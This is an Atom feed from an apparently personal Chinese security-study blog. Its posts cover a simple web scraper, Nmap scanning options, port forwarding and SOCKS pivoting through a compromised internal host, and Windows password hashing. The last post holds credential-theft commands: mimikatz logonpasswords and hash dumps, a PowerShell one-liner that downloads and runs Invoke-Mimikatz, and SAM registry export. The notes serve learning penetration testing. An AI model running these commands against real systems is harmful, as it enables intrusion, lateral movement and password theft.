<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-12-14T14:23:58.952Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[记录一下：第一个简单的爬虫]]></title>
        <id>https://zzggtt.github.io/post/ji-lu-yi-xia-di-yi-ge-jian-dan-de-pa-chong/</id>
        <link href="https://zzggtt.github.io/post/ji-lu-yi-xia-di-yi-ge-jian-dan-de-pa-chong/">
        </link>
        <updated>2020-12-14T13:56:42.000Z</updated>
        <content type="html"><![CDATA[<p>抓取一下雨神的博客（简单款式）：</p>
<pre><code class="language-python"># -*- coding:utf-8 -*-
import requests
import re

def download(url):
    headers = {
      'authority': 'www.cnblogs.com',
      'pragma': 'no-cache',
      'cache-control': 'no-cache',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'sec-fetch-site': 'none',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-user': '?1',
      'sec-fetch-dest': 'document',
      'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    }
    response = requests.request(&quot;GET&quot;, url, headers=headers)
    response.encoding = 'utf-8'
    return response.text

def extract_url(source):
    return re.findall(r'href=&quot;(https://www.cnblogs.com/Rain99-/p/\d+\.html)&quot;', source, re.I)

def paras_title(source):
    title = re.findall(r'&lt;span&gt;(.+?)&lt;/span&gt;', source, re.I)
    print(title)

if __name__ == '__main__':
    u = &quot;https://www.cnblogs.com/Rain99-/p&quot;
    html = download(u)
    links = extract_url(html)
    for l in links:
        html_new = download(l)
        paras_title(html_new)
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域认证-Kerbros]]></title>
        <id>https://zzggtt.github.io/post/yu-ren-zheng-kerbros/</id>
        <link href="https://zzggtt.github.io/post/yu-ren-zheng-kerbros/">
        </link>
        <updated>2020-12-07T08:15:57.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透工具-MSF基础使用]]></title>
        <id>https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/</id>
        <link href="https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/">
        </link>
        <updated>2020-12-06T08:53:23.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从mimkatz学习Windows本地hash抓取]]></title>
        <id>https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/</id>
        <link href="https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/">
        </link>
        <updated>2020-12-02T09:28:36.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows本地认证]]></title>
        <id>https://zzggtt.github.io/post/windows-ben-di-ren-zheng/</id>
        <link href="https://zzggtt.github.io/post/windows-ben-di-ren-zheng/">
        </link>
        <updated>2020-12-02T09:28:11.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nmap基础使用]]></title>
        <id>https://zzggtt.github.io/post/nmap-ji-chu-shi-yong/</id>
        <link href="https://zzggtt.github.io/post/nmap-ji-chu-shi-yong/">
        </link>
        <updated>2020-11-24T09:47:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="工作原理">工作原理</h3>
<p>Nmap使用TCP/IP协议栈进行工作。</p>
<h3 id="usage">Usage</h3>
<blockquote>
<p>nmap [Scan Type(s)] [Options] {target specification}</p>
</blockquote>
<h3 id="target-specification">Target Specification</h3>
<blockquote>
<p>Can pass hostnames, IP addresses, networks, etc.</p>
</blockquote>
<h3 id="host-discovery">Host Discovery</h3>
<pre><code class="language-bash">-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
--dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
--system-dns: Use OS's DNS resolver
--traceroute: Trace hop path to each host
</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sP</td>
<td>Ping扫描</td>
</tr>
<tr>
<td>-P0</td>
<td>无Ping扫描</td>
</tr>
<tr>
<td>-PS/PA/PU/PY</td>
<td>TCP SYN/ACK、UDP、SCTP扫描</td>
</tr>
<tr>
<td>-PE/PP/PM</td>
<td>ICMP echo、timestamp、netmask扫描。</td>
</tr>
<tr>
<td>-PR</td>
<td>ARP扫描</td>
</tr>
<tr>
<td>-sL</td>
<td>列表扫描</td>
</tr>
<tr>
<td>-n/-R</td>
<td>禁止/使用DNS反向域名解析</td>
</tr>
<tr>
<td>--system-dns</td>
<td>使用系统的域名解析器</td>
</tr>
<tr>
<td>--traceroute</td>
<td>路由跟踪</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sP</code></p>
<p>Nmap仅进行ping扫描，然后回显出做响应的主机。使用该选项可以轻易的获取到目标信息而不被发现，是一种非常高效的存活主机扫描方式。</p>
</li>
<li>
<p><code>-P0</code></p>
<p>通常在目标主机<strong>禁Ping</strong>的情况下使用，也可以<strong>绕过某些防火墙</strong>。</p>
</li>
<li>
<p><code>TCP SYN/ACK</code></p>
<p>TCP协议是TCP/IP协议中<strong>面向连接</strong>的、可靠的<strong>传输层协议</strong>。</p>
<p>-PS/PA：nmap会发送一个设置了SYN/ACK标志位的空TCP报文，默认端口为80，也可以指定端口列表（-PS22,23,80,443,3389）。</p>
</li>
<li>
<p><code>-PU</code></p>
<p>UDP协议是TCP/IP协议中<strong>无连接</strong>的<strong>传输层协议</strong>。</p>
<p>-PU：nmap发送一个空的UDP报文到指定的端口，默认为40125端口。</p>
</li>
<li>
<p><code>-PE/PP/PM</code></p>
<p>ICMP是Internet控制报文协议，它是TCP/IP协议族的子协议，工作在<strong>网络层</strong>。用于在IP主机、路由器之间传递控制消息。</p>
<p>-PE/PP/PM：可以进行ICMP echo、timestamp（时间戳）、netmask（地址掩码）扫描。</p>
</li>
<li>
<p><code>-PR</code></p>
<p>ARP即地址解析协议，可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息。</p>
<p>-PR：nmap会对目标进行一个ARP扫描的过程，在本地局域网中防火墙不会禁止ARP请求。所以在<strong>内网存活主机发现</strong>时，-PR会比其他扫描更加高效。</p>
</li>
<li>
<p><code>-n/-R</code></p>
<p>禁止/永远 使用DNS反向域名解析。</p>
<p>当我们单纯扫描一个段IP时，使用-n可以大幅度减少目标主机的响应时间，从而更快的得到结果。</p>
<p>如果想知道IP段上存在哪些网站，-R选项更适用。</p>
</li>
<li>
<p><code>--system-dns</code></p>
<p>通常情况下，nmap通过直接发送查询到目标主机上配置的域名服务器来查询域名，为了提高性能，许多请求并发执行。通过--system-dns可以使用系统自带的解析器。</p>
</li>
<li>
<p><code>--traceroute</code></p>
<p>通过路由跟踪，可以看到本地计算机到目标之间所经过的网络节点。</p>
</li>
</ul>
<h3 id="port-scan">Port Scan</h3>
<pre><code class="language-bash">PORT SPECIFICATION AND SCAN ORDER:
-p &lt;port ranges&gt;: Only scan specified ports
   Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
--exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
-F: Fast mode - Scan fewer ports than the default scan
-r: Scan ports consecutively - don't randomize
--top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
--port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-p</td>
<td>扫描指定端口</td>
</tr>
<tr>
<td style="text-align:left">-F</td>
<td>快速扫描有限的端口</td>
</tr>
<tr>
<td style="text-align:left">-r</td>
<td>随机扫描端口</td>
</tr>
<tr>
<td style="text-align:left">--top-ports</td>
<td>按最常用的top扫描端口</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-p</code></p>
<p>通过-p选项可以指定扫描的端口：</p>
<pre><code class="language-bash">-p22; -p1-65535;
</code></pre>
<p>如果想同时扫描TCP和UDP端口，可以通过“T：”、“U：”来指定：</p>
<pre><code class="language-bash">-sS -p U:53,111,137,T:21-25,80,139,8080
</code></pre>
</li>
<li>
<p><code>-F</code></p>
<p>使用该选项可以快速扫描部分端口，其包含在nmap-services中。</p>
</li>
<li>
<p><code>-r</code></p>
<p>默认情况下nmap是按随机顺序扫描端口的，通过-r选项可以按连续顺序扫描端口。</p>
</li>
<li>
<p><code>--top-ports</code></p>
<p>扫描最常用的top100端口：</p>
<pre><code class="language-bash">nmap --top-ports 100 192.168.213.129
</code></pre>
</li>
<li>
<p><code>--port-ratio</code></p>
<p>同上，按使用频率进行扫描。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sS</td>
<td>TCP SYN 扫描</td>
</tr>
<tr>
<td>-sA</td>
<td>TCP ACK 扫描</td>
</tr>
<tr>
<td>-sT</td>
<td>TCP 扫描</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP扫描</td>
</tr>
<tr>
<td>-sN/sF/sX</td>
<td>隐蔽扫描</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sS</code></p>
<p>TCP SYN扫描被称为半开放式，因为它不打开一个完全的TCP3次握手连接，SYN扫描也可以很明确的区分出端口的开发状态。</p>
<p>因此SYN扫描是一种比较<strong>隐蔽且高效</strong>的扫描方式。</p>
</li>
<li>
<p><code>-sA</code></p>
<p>TCP ACK扫描的缺点很明显，它无法明确是否是开放的还是被过滤的。</p>
</li>
<li>
<p><code>-sT</code></p>
<p>TCP连接扫描，通常用于SYN扫描不能使用的情况下。它会在每个端口上完成3次握手扫描，基本不会导致目标主机崩溃。是最<strong>基础和稳定</strong>的扫描方式。</p>
</li>
<li>
<p><code>-sU</code></p>
<p>UDP扫描可以发现更多的可利用端口，因为很多管理员会忽略这些端口。但是由于UDP的扫描是非常慢的，通常需要-p指定端口。</p>
</li>
</ul>
<h3 id="cms">CMS</h3>
<pre><code class="language-bash">SERVICE/VERSION DETECTION:
-sV: Probe open ports to determine service/version info
--version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
--version-light: Limit to most likely probes (intensity 2)
--version-all: Try every single probe (intensity 9)
--version-trace: Show detailed version scan activity (for debugging)

OS DETECTION:
-O: Enable OS detection
--osscan-limit: Limit OS detection to promising targets
--osscan-guess: Guess OS more aggressively
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-sV</td>
<td>端口 服务/版本</td>
</tr>
<tr>
<td style="text-align:left">--version-intensity</td>
<td>设置扫描强度</td>
</tr>
<tr>
<td style="text-align:left">--version-light</td>
<td>轻量级扫描</td>
</tr>
<tr>
<td style="text-align:left">--version-all</td>
<td>重量级扫描</td>
</tr>
<tr>
<td style="text-align:left">--version-trace</td>
<td>获取详细版本信息</td>
</tr>
<tr>
<td style="text-align:left">-O</td>
<td>启动操作系统探测</td>
</tr>
<tr>
<td style="text-align:left">--osscan-limit</td>
<td>对指定的目标进行操作系统探测</td>
</tr>
<tr>
<td style="text-align:left">--osscan-guess</td>
<td>推测系统识别</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sV</code></p>
<p>使用-sV选项，可以通过相应的端口和服务，根据服务指纹识别出其相应的版本。</p>
<p>再通过-A可以获取更加详细的信息。</p>
</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1606211331244.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><code>--version-trace</code></p>
<p>使用--version-trace可以获取详细版本信息，它对于获取目标主机的额外信息非常有帮助。</p>
</li>
</ul>
<p><img src="https://zzggtt.github.io/post-images/1606211336413.png" alt="" loading="lazy"><br>
<img src="https://zzggtt.github.io/post-images/1606211341246.png" alt="" loading="lazy"></p>
<ul>
<li>
<p><code>-O</code></p>
<p>使用-O选项可以启用操作系统探测：</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1606211345805.png" alt="" loading="lazy"></figure>
<p>可以看出由于Windows防火墙的原因，nmap没有确定哪一个版本的操作系统。</p>
<h3 id="script-scan">SCRIPT SCAN:</h3>
<pre><code class="language-bash">-sC: equivalent to --script=default
--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories

--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
--script-args-file=filename: provide NSE script args in a file
--script-trace: Show all data sent and received
--script-updatedb: Update the script database.
--script-help=&lt;Lua scripts&gt;: Show help about scripts.&lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories.
</code></pre>
<pre><code class="language-bash">IP信息收集：
nmap --script ip-geolocation-* www.baidu.com

whois信息收集：
nmap --script whois www.baidu.com

DNS信息收集：
nmap --script dns-brute www.baidu.com

系统信息收集：
nmap -p 192.168.116.129 --script membase-http-info

系统漏洞扫描（SMB漏洞扫描）：
nmap --script smb-check-vulns.nes -p445 192.168.116.129


</code></pre>
<h3 id="output">Output</h3>
<pre><code class="language-bash">-oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.
-oA &lt;basename&gt;: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)
-d: Increase debugging level (use -dd or more for greater effect)
--reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports
--packet-trace: Show all packets sent and received
--iflist: Print host interfaces and routes (for debugging)
--append-output: Append to rather than clobber specified output files
--resume &lt;filename&gt;: Resume an aborted scan
--stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
--webxml: Reference stylesheet from Nmap.Org for more portable XML
--no-stylesheet: Prevent associating of XSL stylesheet w/XML output
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透基础 - 端口转发与边界代理]]></title>
        <id>https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/</id>
        <link href="https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/">
        </link>
        <updated>2020-11-18T12:41:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="端口转发">端口转发</h3>
<p><code>端口转发:</code></p>
<p>转发一个<strong>网络端口</strong>的数据从一个网络节点到另一个网络节点的行为。</p>
<p><code>应用场景：</code></p>
<p>在进行渗透时，已拿下内网中一台机器的权限，但是想横向渗透内网中的其他机器时。</p>
<p>Client（攻击者）通过Transit Server（内网中已拿下权限的机器）建立的<strong>通道</strong>，连接内网Server（内网中其他机器）的指定端口。</p>
<p><code>正向转发</code></p>
<p>Client能够<strong>正向</strong>连接Transit server。Transit server直接转发即可：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605703324992.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103  connectport=4444
</code></pre>
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
<pre><code class="language-bash">nc -vv 192.168.111.132 7777
</code></pre>
<p><code>反向转发</code></p>
<p>Client无法正向连接Transit server，但Transit server能够<strong>反向</strong>连接Client：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605703332371.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">ew -s lcx_listen -l 2222 -e 1111
</code></pre>
<pre><code class="language-bash">ew -s lcx_slave -d 1.1.1.1 -e 1111 -f 10.0.0.2 -g 3389
</code></pre>
<pre><code class="language-bash">nc -vv 127.0.0.1 2222
</code></pre>
<h3 id="socks协议">Socks协议</h3>
<p>什么是Socks协议？？<br>
<img src="https://zzggtt.github.io/post-images/1605703395820.png" alt="" loading="lazy"></p>
<p>中文意思：防火墙安全会话转换协议，工作在OSI参考模型的<strong>第5层（会话层）。</strong></p>
<p>它是一种可以穿透防火墙的协议，很多场景都会用到。比如Fan墙，你们懂得~~</p>
<p>因为Socks介于传输层与表示层之间，使用TCP协议传输数据，因而<strong>不提供如传递ICMP信息</strong>之类的网络层相关服务。</p>
<p>目前有两个版本：SOCKS4和SOCKS5</p>
<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
<p>Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~</p>
<p><strong>当然啦，基于socks的转发代理有很多的实用的小工具，少侠看图吧~</strong></p>
<p>常见的转发工具及不同平台的代理链工具：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605703403068.png" alt="" loading="lazy"></figure>
<p><strong>代理链工具：</strong></p>
<ul>
<li>
<p>proxychains</p>
<p>https://howiezhao.github.io/2018/10/18/proxychains/</p>
</li>
<li>
<p>proxifier</p>
<p>https://blog.csdn.net/xhaimail/article/details/98743238</p>
</li>
</ul>
<h3 id="代理">代理</h3>
<p><code>应用场景：</code></p>
<p>如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。为了提高效率，这里可以使用代理，配置一次规则即可。<br>
<img src="https://zzggtt.github.io/post-images/1605703445490.png" alt="" loading="lazy"></p>
<p><code>正向代理</code></p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605703450870.png" alt="" loading="lazy"></figure>
<p>Client能够正向连接到Transit server，要对Server1、Server2和Server3的端口进行扫描。</p>
<p><strong>使用EarthWorm：</strong></p>
<p>Transit Server：</p>
<pre><code class="language-bash">ew –s ssocksd –l 8888
</code></pre>
<p>Client使用代理工具连接Transit Server的8888端口，下面通过Windows的代理链工具<strong>proxifier</strong>演示：</p>
<p>连接Transit Server：</p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605703466633.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605703471194.png" alt="" loading="lazy"></figure>
<p>然后配置代理规则，client即可对内网多服务器多端口访问：<br>
<img src="https://zzggtt.github.io/post-images/1605703491952.png" alt="" loading="lazy"></p>
<p><code>反向代理</code></p>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605703501509.png" alt="" loading="lazy"></figure>
<p>Client无法正向连接到Transit server，但Transit server能够反向连接到Client</p>
<p>要对Server1、Server2和Server3的端口进行扫描。</p>
<p><strong>使用EarthWorm：</strong></p>
<p>Client:</p>
<pre><code>ew -s rcsocks -l 2222 -e 1111
</code></pre>
<p>Transit server:</p>
<pre><code>ew -s rssocks -d 1.1.1.1 -e 1111
</code></pre>
<p>使用代理工具连接Client的2222端口，下面通过Linux的代理链工具<strong>proxychains</strong>演示：</p>
<p>Client：</p>
<pre><code class="language-bash">//修改配置文件：（设置代理服务器）
vim /etc/proxychains.conf
socks5     127.0.0.1     2222

//使用：（firefox走代理，访问10.0.0.2）
proxychains firefox 10.0.0.2
</code></pre>
<h3 id="工具">工具</h3>
<h4 id="端口转发-2">端口转发</h4>
<ul>
<li>
<p><strong>lcx（Windows）</strong></p>
<p>lcx是一款轻便的端口转发工具：</p>
<p>a、反向转发</p>
<p>外网VPS机器监听：</p>
<p>lcx.exe -listen 1111 2222</p>
<p>受害者机器执行：</p>
<p>lcx.exe -slave VPSip 1111 127.0.0.1 3389</p>
<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
<p>b、正向转发</p>
<p>A机器执行：</p>
<p>lcx.exe -tran 1111 2.2.2.2 8080</p>
<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
<p>参考：https://juejin.im/post/6844903954401198088</p>
</li>
<li>
<p><strong>netsh（只支持TCP协议）</strong></p>
<p>netsh是<strong>windows</strong>自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
<p>A机器（192.168.130.1）：</p>
<pre><code class="language-bash">netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp
</code></pre>
<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
<p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU1Nzc4MTQwMA==&amp;mid=2247484209&amp;idx=1&amp;sn=982c14d94b83249c5ece1f46023de808&amp;chksm=fc31dbc6cb4652d04a088571b21098ac5a0259bbb2b30b93e11472e912e35fe2f2b628e9d128&amp;scene=21#wechat_redirect">使用netsh进行端口转发</a></p>
</li>
<li>
<p><strong>portmap</strong></p>
</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605703523922.png" alt="" loading="lazy"></figure>
<ul>
<li><strong>iptables</strong></li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605703527604.png" alt="" loading="lazy"></figure>
<h4 id="代理-2">代理</h4>
<ul>
<li>
<p><strong>reGeorg</strong></p>
<p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，把内网服务器的端口通过http/https隧道转发到本机。</p>
<p>参考：</p>
<p><a href="https://www.k0rz3n.com/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/">配置reGeorg+Proxifier渗透内网</a></p>
<p><a href="https://xz.aliyun.com/t/228">reGeorg+Proxifier使用</a></p>
</li>
<li>
<p><strong>Earthworm</strong></p>
<p>跨平台+端口转发+socket代理结合体</p>
<p>http://rootkiter.com/EarthWorm/</p>
<p>https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA</p>
</li>
<li>
<p><strong>goproxy</strong></p>
<p>go实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转</p>
<p>下载地址：</p>
<p>https://github.com/snail007/goproxy/</p>
<p>Transit server:</p>
<pre><code class="language-bash">proxy socks -t tcp -p &quot;0.0.0.0:8888&quot;
</code></pre>
</li>
<li>
<p><strong>ssh</strong></p>
</li>
<li>
<p><strong>xsocks</strong></p>
</li>
</ul>
<p>参考：</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础-端口转发与代理</a></p>
<p><a href="https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA">内网渗透之代理转发</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[window本地认证与hash抓取]]></title>
        <id>https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/</id>
        <link href="https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/">
        </link>
        <updated>2020-11-16T14:06:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="windows本地认证">Windows本地认证</h3>
<p>登陆到本机的过程：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605535647568.png" alt="" loading="lazy"></figure>
<ol>
<li>用户首先按Ctrl+Alt+Del组合键。</li>
<li>Winlogon检测到用户按下SAS键，就调用GINA，由GINA显示登录对话框，以便用户输入账号和密码。</li>
<li>用户输入账号和密码，确定后，GINA把信息发送给LSA进行验证。</li>
<li>在用户登录到本机的情况下，LSA会调用Msv1_0.dll这个验证程序包，将用户信息处理后生成密钥，同SAM数据库中存储的密钥进行对比。</li>
<li>如果对比后发现用户有效，SAM会将用户的SID，用户所属用户组的SID，和其他一些相关信息发送给LSA。</li>
<li>LSA将收到的SID信息创建安全访问令牌，然后将令牌的句柄和登录信息发送给Winlogon.exe。</li>
<li>Winlogon.exe对用户登录稍作处理后，完成整个登录过程。</li>
</ol>
<p>可以看出本地用户的密码是存储在SAM文件中。它用于储存本地所有用户的凭证信息，位于：<strong>C:\Windows\System32\config\sam</strong>。</p>
<p>Windows不会存储文明密码的，而是存储密码的hash值，上诉第四步中所说的密钥就是<strong>密码hash</strong>。</p>
<p><strong>参考：</strong></p>
<p><a href="https://blog.csdn.net/u013776188/article/details/79986479">Windows本地登陆</a></p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/">渗透技巧——Windows中Credential Manager的信息获取</a></p>
<p><a href="https://xz.aliyun.com/t/8127#toc-3">由Windows本地认证到Hash抓取</a></p>
<h3 id="windows-hash">Windows hash</h3>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
<th style="text-align:left">2000</th>
<th style="text-align:left">xp</th>
<th style="text-align:left">2003</th>
<th style="text-align:left">Vista</th>
<th style="text-align:left">win7</th>
<th style="text-align:left">2008</th>
<th style="text-align:left">2012</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">LM</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">NTLM</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody>
</table>
<p>Windows使用的hash有：<strong>LMHASH</strong>和<strong>NTLMHASH</strong>。</p>
<ul>
<li>
<p><strong>LM HASH</strong></p>
<p>lmhash作为Windows早期使用的密码hash，其加密流程如下：</p>
<p>1、密码长度<strong>限制为14个字符</strong></p>
<p>2、密码全部转换为大写</p>
<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
<p>4、密码的16进制字符串被分成两个7byte部分</p>
<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
</li>
<li>
<p><strong>NTLM HASH</strong></p>
<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash，其加密流程如下：</p>
<p>1、先将用户密码转换为十六进制格式。</p>
<p>2、将十六进制格式的密码进行Unicode编码。</p>
<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
<p>其格式如下：</p>
<pre><code class="language-bash">username:SID:LM-Hash:NTLM-Hash

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre>
<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee（这表示<strong>空密码或者是未使用LM_HASH</strong>）</p>
<p>在hash传递攻击时，可以替换成0：</p>
<p>00000000000000000000000000000000</p>
</li>
</ul>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">红蓝对抗之Windows内网渗透</a></p>
<p><a href="https://github.com/l3m0n/pentest_study">从零开始学内网渗透</a></p>
<h3 id="本地hash抓取">本地hash抓取</h3>
<h4 id="mimikatz">mimikatz</h4>
<p>只能抓取登陆过的用户hash，无法抓取所有用户，需要免杀：</p>
<ul>
<li>
<p>meterpreter中直抓取内存中的hash：</p>
<pre><code class="language-bash">mimikatz_command -f  samdump::hashes
</code></pre>
</li>
<li>
<p>meterpreter中直抓取内存中的明文密码：</p>
<pre><code class="language-bash">mimikatz_command -f sekurlsa::logonpasswords
</code></pre>
</li>
<li>
<p>非交互式抓明文密码(webshell中)</p>
<pre><code class="language-bash">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt
</code></pre>
</li>
<li>
<p>powershell加载mimikatz抓取密码</p>
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
</code></pre>
</li>
</ul>
<p>MSF中mimikatz使用参考：https://blog.csdn.net/weixin_45116657/article/details/103147716</p>
<h4 id="reg">reg</h4>
<p>Win2000和XP需要先提到SYSTEM，03开始直接可以reg save，导出的文件大，效率低，但是可以绕过杀软。</p>
<p>在meterpreter中使用shell命令来到交互式cmd，然后<strong>导出注册表</strong>：</p>
<p>（在c盘下就导出了三个注册表文件）</p>
